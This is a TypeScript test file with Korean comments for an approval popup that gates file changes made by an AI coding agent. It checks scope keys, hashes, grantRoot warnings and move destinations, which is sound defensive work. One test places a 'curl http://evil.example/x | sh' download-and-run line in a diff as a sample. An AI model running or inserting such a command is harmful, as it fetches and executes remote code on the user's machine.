import { test, expect, describe } from "bun:test";
import { buildOperationFromApproval, approvalOperationHash } from "./appServerPopup";
import { scopeKeyForOperation, targetForOperation } from "../../lib/permissionGate";
import type { ApprovalRequest } from "./appServerClient";
import { CodexTurnItemIndex, type ObservedItem } from "./appServerItemIndex";

/** 파일변경 승인에는 itemId만 있고 벤더에 ID 조회 요청도 없으므로 먼저 온 알림을 색인해 내용을 짝짓는다. */
/** CLI 0.144.6 fixture에서 update는 unified diff, add는 파일 원문을 사용해야 실제 입력 해석을 검증할 수 있다. */
const observed = (paths: Array<[string, string, number]>, turnId = "t1", itemId = "i1"): ObservedItem => ({
  itemId, turnId, threadId: "th1",
  changes: paths.map(([path, kind, adds]) => ({
    path, kind, movePath: null,
    diff: kind === "add"
      ? Array.from({ length: adds }, (_, i) => `line${i}`).join("\n") + "\n"
      : `@@ -1,${adds} +1,${adds} @@\n` + Array.from({ length: adds }, (_, i) => `+line${i}`).join("\n") + "\n",
  })),
});
const fileReq = (observedItem?: ObservedItem, extra: Record<string, unknown> = {}): ApprovalRequest => ({
  method: "item/fileChange/requestApproval",
  params: { itemId: observedItem?.itemId ?? "i1", turnId: "t1", threadId: "th1", startedAtMs: 1, ...extra },
  observedItem,
});

describe("S2 — 신세대 파일변경 승인 해석", () => {
  test("★짝지어진 알림이 있으면 실제 파일을 쓰기 작업으로 해석한다★", () => {
    const op = buildOperationFromApproval(fileReq(observed([["src/a.ts", "update", 3]])), "dex");
    expect(op.action).toBe("write");
    // S3 — 이 한 줄이 화면이다. targetForOperation 이 text 가 아니라 path 를 쓰므로(우선순위
    //   command > path > egress_url > text), path 자체가 사람이 읽을 말이어야 한다.
    expect(op.path).toMatch(/^파일 1개 · update src\/a\.ts #[0-9a-f]{12}$/);
    expect(targetForOperation(op)).toBe(op.path ?? ""); // 화면에 그대로 나온다(240자 안)
  });

  test("사람이 규모를 볼 수 있다 — 종류·경로·줄수 요약", () => {
    const op = buildOperationFromApproval(
      fileReq(observed([["src/b.ts", "add", 12], ["src/a.ts", "update", 2]])), "dex");
    expect(op.text).toContain("파일 2개");
    expect(op.text).toContain("add src/b.ts(+12/-0)");
    expect(op.text).toContain("update src/a.ts(+2/-0)");
  });

  test("★짝이 없으면 내용을 지어내지 않는다 — 매번 묻는 경로로 간다★", () => {
    const op = buildOperationFromApproval(fileReq(undefined), "dex");
    expect(op.action).toBe("approval_unparsed");
    expect(targetForOperation(op)).toMatch(/#[0-9a-f]{16}/);
  });

  test("★혼합 payload — 파일변경 method + 짝 없음 + fileChanges 는 write 가 아니라 unparsed★", () => {
    // 항목을 찾지 못한 파일변경 승인은 해석 실패로 멈춘다. malformed payload의 fileChanges를 다른 승인 경로로 재활용하면 안 된다.
    const mixed: ApprovalRequest = {
      method: "item/fileChange/requestApproval",
      params: { itemId: "i1", turnId: "t1", threadId: "th1", startedAtMs: 1, fileChanges: { "x.ts": {} } },
    };
    expect(buildOperationFromApproval(mixed, "dex").action).toBe("approval_unparsed");
  });

  test("★관측은 됐는데 변경이 비어 있으면 '내용 없는 쓰기 승인' 을 만들지 않는다★", () => {
    const empty: ObservedItem = { itemId: "i1", turnId: "t1", threadId: "th1", changes: [] };
    expect(buildOperationFromApproval(fileReq(empty), "dex").action).toBe("approval_unparsed");
  });

  test("같은 파일집합은 같은 열쇠 · 다른 파일집합은 다른 열쇠 — '항상 허용' 이 의미를 갖는다", () => {
    const a = buildOperationFromApproval(fileReq(observed([["src/a.ts", "update", 1]])), "dex");
    const a2 = buildOperationFromApproval(fileReq(observed([["src/a.ts", "update", 99]])), "dex"); // 내용만 다름
    const b = buildOperationFromApproval(fileReq(observed([["src/b.ts", "update", 1]])), "dex");
    expect(scopeKeyForOperation(a)).toBe(scopeKeyForOperation(a2)); // 열쇠 단위 = 파일, 내용 아님
    expect(scopeKeyForOperation(a)).not.toBe(scopeKeyForOperation(b));
  });

  test("★새 파일 생성이 '(+0/-0)' 으로 보이지 않는다★ — add 의 diff 는 통일diff 가 아니라 파일 원문이다", () => {
    // 라이브 실측: add 의 diff = "HELLO\n". `+` 접두어가 없어서 통일diff 로 세면 +0 이 나오고,
    // 사람에겐 "아무것도 안 바뀐다" 로 읽힌다. 승인 화면에서 그건 거짓말이다.
    const item: ObservedItem = {
      itemId: "i1", turnId: "t1", threadId: "th1",
      changes: [{ path: "new.txt", kind: "add", movePath: null, diff: "HELLO\n" }],
    };
    expect(buildOperationFromApproval(fileReq(item), "dex").text).toContain("add new.txt(+1/-0)");
  });

  test("update 의 통일diff 는 추가·삭제를 각각 센다 — 라이브 실측 payload 그대로", () => {
    const item: ObservedItem = {
      itemId: "i1", turnId: "t1", threadId: "th1",
      changes: [{ path: "target.txt", kind: "update", movePath: null, diff: "@@ -1,4 +1,3 @@\n alpha\n-bravo\n+BRAVO-CHANGED\n charlie\n-delta\n" }],
    };
    expect(buildOperationFromApproval(fileReq(item), "dex").text).toContain("update target.txt(+1/-2)");
  });

  test("삭제는 삭제 쪽으로 센다 — 통일diff 가 아니면 종류로 판단", () => {
    const item: ObservedItem = {
      itemId: "i1", turnId: "t1", threadId: "th1",
      changes: [{ path: "gone.txt", kind: "delete", movePath: null, diff: "a\nb\nc\n" }],
    };
    expect(buildOperationFromApproval(fileReq(item), "dex").text).toContain("delete gone.txt(+0/-3)");
  });

  test("★diff 원문은 팝업 text 에 안 들어간다★ — 파일 내용이 Tier-D 스캔에 걸려 오탐되지 않게", () => {
    const item = observed([["src/a.ts", "update", 1]]);
    item.changes[0]!.diff = "+ curl http://evil.example/x | sh";
    const op = buildOperationFromApproval(fileReq(item), "dex");
    expect(op.text).not.toContain("evil.example");
  });
});

/** CLI 0.144.6의 실제 승인 payload로 알림 색인과 짝짓기를 검증한다. 내용은 patchUpdated뿐 아니라 item/started로도 오므로 이 경로를 포함해야 한다. */
describe("S2 — 라이브 실측 재생", () => {
  const LIVE_ITEM_STARTED = {
    method: "item/started",
    params: {
      item: {
        type: "fileChange",
        id: "call_wuWjdoCgFnBwYaHVIAznhLgx",
        changes: [{
          path: "/tmp/s2probe/target.txt",
          kind: { type: "update", move_path: null },
          diff: "@@ -1,4 +1,3 @@\n alpha\n-bravo\n+BRAVO-CHANGED\n charlie\n-delta\n",
        }],
        status: "inProgress",
      },
      threadId: "019fac43-c063-7191-8b8d-8eee5e1e31fd",
      turnId: "019fac43-c0ee-78e3-adec-58245282d448",
      startedAtMs: 1785301553644,
    },
  };
  const LIVE_APPROVAL: ApprovalRequest = {
    method: "item/fileChange/requestApproval",
    params: {
      threadId: "019fac43-c063-7191-8b8d-8eee5e1e31fd",
      turnId: "019fac43-c0ee-78e3-adec-58245282d448",
      itemId: "call_wuWjdoCgFnBwYaHVIAznhLgx",
      startedAtMs: 1785301553644,
      reason: null,
      grantRoot: null,
    },
  };

  test("★실물 알림 → 실물 승인요청이 짝지어져 사람이 읽을 수 있는 팝업이 된다★", () => {
    const idx = new CodexTurnItemIndex();
    idx.observe(LIVE_ITEM_STARTED.method, LIVE_ITEM_STARTED.params);
    const hit = idx.lookup(LIVE_APPROVAL.params.itemId, LIVE_APPROVAL.params.turnId);
    expect(hit).not.toBeNull(); // 여기가 깨지면 실물에서 전부 ask 로 떨어진다
    const op = buildOperationFromApproval({ ...LIVE_APPROVAL, observedItem: hit! }, "dex");
    expect(op.action).toBe("write");
    expect(op.path).toMatch(/^파일 1개 · update \/tmp\/s2probe\/target\.txt #[0-9a-f]{12}$/);
    expect(op.text).toContain("update /tmp/s2probe/target.txt(+1/-2)");
    expect(op.provenance?.grant_root).toBeNull();
  });

  test("★실물 turnId 가 다르면 짝이 아니다★ — 값 모양(uuid)까지 실물로 확인", () => {
    const idx = new CodexTurnItemIndex();
    idx.observe(LIVE_ITEM_STARTED.method, LIVE_ITEM_STARTED.params);
    expect(idx.lookup(LIVE_APPROVAL.params.itemId, "019fac43-0000-0000-0000-000000000000")).toBeNull();
  });
});

/** grantRoot는 파일 몇 개가 아니라 세션 동안 폴더 하위 전체 쓰기를 허용하므로 파일 목록만으로 scope·요청 해시를 만들면 안 된다. */
describe("S2 — grantRoot 는 별개 승인이다", () => {
  test("★구세대: grantRoot 가 붙으면 열쇠가 달라진다★ (붙기 전 열쇠로 통과되면 안 된다)", () => {
    const plain: ApprovalRequest = { method: "applyPatchApproval", params: { fileChanges: { "a.ts": {}, "b.ts": {} }, callId: "c1" } };
    const rooted: ApprovalRequest = { method: "applyPatchApproval", params: { fileChanges: { "a.ts": {}, "b.ts": {} }, callId: "c1", grantRoot: "/repo" } };
    const opPlain = buildOperationFromApproval(plain, "dex");
    const opRoot = buildOperationFromApproval(rooted, "dex");
    expect(scopeKeyForOperation(opPlain)).not.toBe(scopeKeyForOperation(opRoot));
    expect(approvalOperationHash(plain)).not.toBe(approvalOperationHash(rooted));
    expect(opRoot.text).toContain("세션 동안");
    expect(opRoot.text).toContain("/repo");
  });

  test("★신세대: grantRoot 가 붙으면 열쇠가 달라진다★", () => {
    const item = observed([["src/a.ts", "update", 1]]);
    const plain = buildOperationFromApproval(fileReq(item), "dex");
    const rooted = buildOperationFromApproval(fileReq(item, { grantRoot: "/repo" }), "dex");
    expect(scopeKeyForOperation(plain)).not.toBe(scopeKeyForOperation(rooted));
    expect(rooted.provenance?.grant_root).toBe("/repo");
  });

  test("★target 이 240자로 잘려도 grant_root 가 살아남는다★ — 제일 위험한 정보가 잘리면 안 된다", () => {
    // permissionGate.targetForOperation 은 앞 240자만 쓴다. 파일 목록이 길면 뒤가 통째로 잘린다 —
    // grantRoot 를 뒤에 붙였다면 잘려나가서 평범한 파일 승인과 같은 열쇠 가 된다. 그래서 맨 앞에 둔다.
    const many = Array.from({ length: 40 }, (_, i) => [`src/very/long/path/file${i}.ts`, "update", 1] as [string, string, number]);
    const rooted = buildOperationFromApproval(fileReq(observed(many), { grantRoot: "/repo" }), "dex");
    const plain = buildOperationFromApproval(fileReq(observed(many)), "dex");
    // 표시 예산을 넘은 파일은 단어 중간을 자르지 않고 생략 개수를 알려야 승인 범위를 오인하지 않는다.
    expect(targetForOperation(rooted)).toContain("…외");
    expect(targetForOperation(rooted).length).toBeLessThanOrEqual(240);
    // 사람이 볼 경고가 맨 앞에 남는다 — 이건 '파일 몇 개' 가 아니라 '폴더 전체' 요청이다.
    expect(targetForOperation(rooted).startsWith("⚠")).toBe(true);
    // 열쇠 operation hash 가 절단선 안에 살아남는다 — 이게 P2 재발 방지의 조건이다(뒤에 두되 예산을 먼저 뗀다).
    expect(targetForOperation(rooted)).toMatch(/#[0-9a-f]{12}$/);
    expect(scopeKeyForOperation(rooted)).not.toBe(scopeKeyForOperation(plain));
  });

  test("빈 grantRoot·공백은 없는 것으로 본다 — 경고를 남발하지 않는다", () => {
    const item = observed([["src/a.ts", "update", 1]]);
    for (const blank of ["", "   ", null, undefined, 123]) {
      const op = buildOperationFromApproval(fileReq(item, { grantRoot: blank }), "dex");
      expect(op.path).toMatch(/^파일 1개 · update src\/a\.ts #[0-9a-f]{12}$/);
      expect(op.path?.startsWith("⚠")).toBe(false); // 경고를 남발하지 않는다
      expect(op.provenance?.grant_root).toBeNull();
    }
  });
});

/** 팝업 표시와 scope가 다른 작업을 가리키면 지속 허용 후 다시 묻지 않으므로 표시뿐 아니라 실제 권한 범위도 구분해야 한다. */
describe("S2 — 이동 목적지(P1)", () => {
  const moveReq = (movePath: string): ApprovalRequest => ({
    method: "item/fileChange/requestApproval",
    params: { itemId: "i1", turnId: "t1", threadId: "th1", startedAtMs: 1 },
    observedItem: {
      itemId: "i1", turnId: "t1", threadId: "th1",
      changes: [{ path: "a.ts", kind: "update", movePath, diff: "@@ -1 +1 @@\n-x\n+y\n" }],
    },
  });

  test("★목적지가 다르면 열쇠가 다르다★ — 안전한 이동에 준 허용이 임의 목적지에 재사용되면 안 된다", () => {
    const safe = buildOperationFromApproval(moveReq("safe.ts"), "dex");
    const evil = buildOperationFromApproval(moveReq("outside/target.ts"), "dex");
    // 재현(수정 전): 팝업 문구는 달랐는데 scopeKey 가 완전히 같았다.
    expect(safe.text).not.toBe(evil.text);
    expect(scopeKeyForOperation(safe)).not.toBe(scopeKeyForOperation(evil));
    expect(safe.path).toMatch(/^파일 1개 · update a\.ts → safe\.ts #[0-9a-f]{12}$/); // 목적지가 화면에 보인다
  });

  test("★구세대에도 같은 구멍이 있었다★ — UpdateFileChange.move_path", () => {
    const mk = (movePath: string): ApprovalRequest => ({
      method: "applyPatchApproval",
      params: { fileChanges: { "a.ts": { type: "update", unified_diff: "d", move_path: movePath } }, callId: "c1" },
    });
    const safe = mk("safe.ts"), evil = mk("outside/target.ts");
    expect(scopeKeyForOperation(buildOperationFromApproval(safe, "dex")))
      .not.toBe(scopeKeyForOperation(buildOperationFromApproval(evil, "dex")));
    expect(approvalOperationHash(safe)).not.toBe(approvalOperationHash(evil)); // 지문도 갈려야 한다
  });

  test("이동이 아니면 표기가 예전과 똑같다 — 구세대 값 불변 조건", () => {
    const op = buildOperationFromApproval({
      method: "applyPatchApproval",
      params: { fileChanges: { "b.ts": { type: "add", content: "x" }, "a.ts": {} }, callId: "c1" },
    }, "dex");
    // S3 에서 표시 형식이 바뀌었다(의도) — 파일집합·정렬은 그대로, 사람이 읽을 종류·개수와 operation hash 가 붙었다.
    expect(op.path).toMatch(/^파일 2개 · change a\.ts, add b\.ts #[0-9a-f]{12}$/);
  });
});

describe("S2 — 긴 grantRoot(P2)", () => {
  const longRoot = (suffix: string) => "/" + "x".repeat(309) + suffix;
  const mkNew = (root: string): ApprovalRequest => ({
    method: "item/fileChange/requestApproval",
    params: { itemId: "i1", turnId: "t1", threadId: "th1", startedAtMs: 1, grantRoot: root },
    observedItem: {
      itemId: "i1", turnId: "t1", threadId: "th1",
      changes: [{ path: "a.ts", kind: "update", movePath: null, diff: "@@ -1 +1 @@\n-x\n+y\n" }],
    },
  });

  test("★공통 prefix 가 길어도 서로 다른 루트는 서로 다른 열쇠·지문★", () => {
    // 재현(수정 전): grantRoot 를 300자로 먼저 잘라서 두 루트가 같은 값이 됐고, 열쇠도 operation hash 도 같았다.
    // 이제 열쇠에는 전체의 operation hash 을 맨 앞에 넣는다 — 240자 절단이 operation hash 를 못 자른다.
    const one = mkNew(longRoot("/one")), two = mkNew(longRoot("/two"));
    expect(scopeKeyForOperation(buildOperationFromApproval(one, "dex")))
      .not.toBe(scopeKeyForOperation(buildOperationFromApproval(two, "dex")));
    expect(approvalOperationHash(one)).not.toBe(approvalOperationHash(two));
    // 루트 원문은 표시용으로 줄어들지만(뒤 71자) operation hash 가 전체를 담아 열쇠를 가른다.
    expect(targetForOperation(buildOperationFromApproval(one, "dex"))).toMatch(/#[0-9a-f]{12}$/);
  });

  test("구세대도 같다", () => {
    const mk = (root: string): ApprovalRequest => ({
      method: "applyPatchApproval",
      params: { fileChanges: { "a.ts": {} }, callId: "c1", grantRoot: root },
    });
    const one = mk(longRoot("/one")), two = mk(longRoot("/two"));
    expect(scopeKeyForOperation(buildOperationFromApproval(one, "dex")))
      .not.toBe(scopeKeyForOperation(buildOperationFromApproval(two, "dex")));
    expect(approvalOperationHash(one)).not.toBe(approvalOperationHash(two));
  });

  test("긴 루트여도 사람이 볼 경고는 남는다", () => {
    const op = buildOperationFromApproval(mkNew(longRoot("/one")), "dex");
    expect(op.text).toContain("세션 동안");
    expect(op.provenance?.grant_root).toBe(longRoot("/one")); // audit 에는 전체가 남는다
  });
});

/**
 * 회귀 가드 — 구세대 경로는 값까지 그대로여야 한다.
 * 진행 중인 승인의 상관키가 어긋나면 결정이 배달되지 않는다(fail-closed 로 거절된다).
 */
describe("S2 — 구세대 불변", () => {
  test("★grantRoot 없는 구세대 지문 값이 S2 이전과 동일하다★ — 정본 4430021 실측 golden", () => {
    const apply: ApprovalRequest = { method: "applyPatchApproval", params: { fileChanges: { "b.ts": {}, "a.ts": {} }, callId: "c1" } };
    expect(approvalOperationHash(apply)).toBe("c7fa63459c642993");
    const op = buildOperationFromApproval(apply, "dex");
    // 요청 상관키인 operation hash는 호환성을 유지하고 scope는 별도로 구분한다.
    expect(op.path).toMatch(/^파일 2개 · change a\.ts, change b\.ts #[0-9a-f]{12}$/);
    expect(op.text).toBe("파일 2개: change a.ts, change b.ts");
  });

  test("★구세대 명령 지문 값도 그대로다★ — S1 golden 재확인(basis 에 키를 무조건 추가하지 않았다)", () => {
    const exec: ApprovalRequest = { method: "execCommandApproval", params: { command: ["ls", "-la"], cwd: "/tmp" } };
    expect(approvalOperationHash(exec)).toBe("b1a8a5879bc13205");
  });

  test("★한 턴에 온 서로 다른 파일변경 승인은 서로 다른 지문을 갖는다★ — 상관키가 둘을 구분해야 한다", () => {
    // 신세대 파일변경 params 는 command·fileChanges·reason 이 전부 없다. itemId 를 안 넣으면
    // 두 요청의 operation hash 가 같아진다(S1 에서 문자열 command 로 겪은 것과 같은 형태).
    const a: ApprovalRequest = { method: "item/fileChange/requestApproval", params: { itemId: "i1", turnId: "t1", threadId: "th1", startedAtMs: 1 } };
    const b: ApprovalRequest = { method: "item/fileChange/requestApproval", params: { itemId: "i2", turnId: "t1", threadId: "th1", startedAtMs: 1 } };
    expect(approvalOperationHash(a)).not.toBe(approvalOperationHash(b));
  });
});
